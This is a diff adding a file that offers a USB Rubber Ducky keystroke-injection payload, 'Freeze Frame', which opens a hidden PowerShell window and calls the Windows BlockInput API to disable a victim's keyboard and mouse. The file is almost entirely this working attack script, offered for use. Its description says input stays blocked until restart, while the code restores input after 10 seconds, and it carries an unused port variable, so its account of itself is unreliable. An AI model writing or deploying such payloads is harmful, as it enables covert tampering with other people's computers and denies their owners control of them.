@@ -1,0 +1,22 @@
+Payloads:
+
+
+Title: Freeze Frame
+
+Description: payload that shuts off the keyboard and mouse till restarted
+
+
+Ducky Code: 
+
+DELAY 2000
+REM Disable Keyboard and Mouse
+GUI r
+DELAY 500
+STRING powershell.exe -WindowStyle Hidden -Command "$port=8888;$signature = @'
+[DllImport("user32.dll")] public static extern int BlockInput(int fBlockIt);
+'@;$type = Add-Type -MemberDefinition $signature -Name BlockInput -PassThru;[void]$type::BlockInput(1);Start-Sleep -s 10;[void]$type::BlockInput(0)"
+ENTER
+
+
+```
+
